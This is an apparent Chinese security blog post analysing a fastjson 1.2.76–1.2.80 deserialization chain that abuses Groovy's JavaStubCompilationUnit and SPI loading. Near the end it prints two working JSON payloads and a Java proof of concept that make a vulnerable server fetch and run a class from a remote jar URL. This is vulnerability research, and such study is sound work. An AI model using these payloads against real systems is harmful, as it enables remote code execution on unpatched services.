---
title: "fastjson 1.2.76-1.2.80 groovy链"
onlyTitle: true
date: 2025-5-28 15:56:06
categories:
- java
- 框架漏洞
tags:
- fastjson
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8157.jpg
---

不出意外，groovy利用还是脱不开AST注解、GroovyShell、GroovyClassLoader这几个东西

## fastjson groovy链

来自2022KCON 浅蓝师傅的议题

利用条件：

* 1.2.76 <= fastjson < 1.2.83

* 存在Groovy依赖
* 两次parse解析，且第一次会抛出异常，第一次异常不能中断程序
* 出网

看起来是个很鸡肋的洞，可以说fastjson在高版本的限制已经非常大了，不过其中提前缓存期望类的姿势依旧值得学习

根据fastjson反序列化匹配黑白名单过程（见下面链接），我们可以知道在fastjson >= 1.2.68版本下利用期望类绕过的可能仍然存在，虽然AutoCloseable被列入了期望类黑名单

https://godownio.github.io/2025/05/27/fastjson-quan-ban-ben-fan-xu-lie-hua-pi-pei-hei-bai-ming-dan-guo-cheng/

但是Throwable.class依旧可用，但是我们今天要提到的，不是上传Exception子类这种鸡肋的利用手法，而是利用到了org.codehaus.groovy.control.CompilationFailedException

```xml
        <dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-all</artifactId>
            <version>3.0.12</version>
        </dependency>
```

### TypeUtils.cast缓存期望类

我们利用Throwable作为白名单期望类，可以轻易的利用ThrowableDeserializer反序列化CompilationFailedException类，我们这里关注的是，为什么要传入`"unit":{}`？

```perl
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250527215621780.png)

第一次checkAutoType把Exception设置为了期望类，第二次通过ThrowableDeserializer调用到checkAutoType ，通过TypeUtils.loadClass加载了CompilationFailedException

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250527221204093.png)

我们看一下loadClass返回后的代码

注意到是个死循环解析json字符串， checkAutoType后应该解析`"unit":{}`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250527221921432.png)

很显然会进入最后一个else，把待解析的内容先放到otherValues

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250527222127375.png)

key为unit，parser.parse()解析JSON字符串的unit属性的值，指定为空，所以这里值为空

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528114631977.png)

注意以上都是在for循环中进行的，for循环结束后exClass为CompilationFailedException，otherValues为unit键和空值

然后otherValues不为空，取出exClass的反序列化器ThrowableDeserializer并强转为JavaBeanDeserializer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528114808685.png)

接着看下面的if，遍历所有额外字段，通过反射设置到异常对象的对应属性上；
若字段类型不匹配，则进行TypeUtils.cast类型转换后再赋值。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528115030580.png)

比如这里fieldInfo为"unit"，其fieldType为class org.codehaus.groovy.control.ProcessingUnit，而解析的value是为空的JSONObject，肯定不能直接反射赋值上去对吧，所以得先TypeUtils.cast类型转换，再setValue赋值

我们继续跟进TypeUtils.cast，中间略过，跟进到TypeUtils.castToJavaBean，这里会getDeserializer去取ProcessingUnit的反序列化器，然后调用createInstance去实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528120603698.png)

我们跟进这个getDeserializer，可以发现其对应的反序列化器是通过createJavaBeanDeserializer创建的，其实大部分类的反序列化器都是经过这个方法创建的。得到的反序列化器为JavaBeanDeserializer，然后一个非常关键的点，调用了putDeserializer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528120658057.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528120814332.png)

这里把ProcessingUnit放到了反序列化器缓存表deserializers里

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528121314177.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528121106957.png)

我们想一下，这个deserializers是不是很眼熟？

对了！就是在checkAutoType中，会从deserializers缓存表中查找传入的typeName

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528121514655.png)

这就导致经过TypeUtils.cast会缓存类，之后的程序可以直接传入该类，或者作为期望类（这样就能传入其子类）进行绕过



### JavaStubCompilationUnit

ProcessingUnit有什么子类可以用吗？

JavaStubCompilationUnit继承了ProcessingUnit

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528145729421.png)

JavaStubCompilationUnit构造函数接收三个参数，并调用了父类的构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528145821005.png)

super向上传递会调用到ProcessingUnit的构造函数，进而调用到setClassLoader

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528150039694.png)

setClassLoader中会实例化GroovyClassLoader

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528150138687.png)

GroovyClassLoader会解析config中的Classpath，并调用addClasspath把url添加到ucp中

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528150316960.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528150544730.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528150552934.png)

完成从config中提取path后，回到CompilationUnit，调用了ASTTransformationVisitor.addPhaseOperations

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528150914272.png)

经过addPhaseOperations -> addGlobalTransforms -> doAddGlobalTransforms 

在这个函数内获取了META-INF/services/org.codehaus.groovy.transform.ASTTransformation配置文件作为globalServices

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528151105639.png)

根据配置文件去获取加载class，而且如果是ASTTransformation的子类，还会进行实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528151340886.png)

这里其实就是spi的思想，我们在snakeYaml等很多地方都遇到过spi机制的应用



哎有同学可能会有疑问，我们不是只用到了CompilationUnit吗，为什么要用JavaStubCompilationUnit封装？

因为CompilationUnit有无参构造方法，而fastjson检测到没有无参构造方法才会去调用有参构造

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528154446842.png)

### 利用

见fastjsonVul

https://github.com/Lonely-night/fastjsonVul

先编译一个有spi服务的jar，然后需要有两次parse去解析两个payload，第一次解析是为了把org.codehaus.groovy.control.CompilationFailedException的unit字段，也就是ProcessingUnit设置为期望类，这样就能反序列化ProcessingUnit及其子类了。第二次解析是查找远程service，进而通过spi实例化恶意类

```json
//两次parse
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://127.0.0.1:8080/"
    },
    "gcl":null,
    "destDir":"/tmp"
}
```

```java

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class Groovy1_2_76To80 {

    public static void main(String[] args) {
        String json ="{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "  \"unit\":{\n" +
                "  }\n" +
                "}";

        try {
            // 反序列化将org.codehaus.groovy.control.ProcessingUnit 加入白名单
            JSON.parse(json);
        } catch (Exception e) {
            //e.printStackTrace();
        }

        json =
                "{\n" +
                        "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                        "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                        "  \"config\":{\n" +
                        "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                        "    \"classpathList\":[\"http://127.0.0.1:8888/fastjsonSPIJAR-1.0-SNAPSHOT.jar\"]\n" +
                        "  },\n" +
                        "  \"gcl\":null,\n" +
                        "  \"destDir\": \"/tmp\"\n" +
                        "}";
        // 反序列化将执行
        JSONObject.parse(json);
        
    }
}
```



为什么fastjson >=1.2.76才能用这个链?

因为在此版本下ThrowableDeserializer中并没有TypeUtils.cast，也就无从设置期望类的缓存了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528154700162.png)

但是这种利用需要两次parse，因为第一次parse，ProcessingUnit是无法设置到Exception的字段中的，所以要求第一次parse后程序不能中断，利用条件很苛刻

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528155048924.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528155142733.png)



另外还有配合ognl / commons-io / aspectj / commons-codec的写文件，属于是大师傅的炫技之作了

https://github.com/kezibei/fastjson_payload/blob/main/src/test/Fastjson26_ognl_io_write_4.java

总结说来，这个版本fastjson出现的漏洞源于可以将期望类进行缓存



参考：

https://www.freebuf.com/vuls/361576.html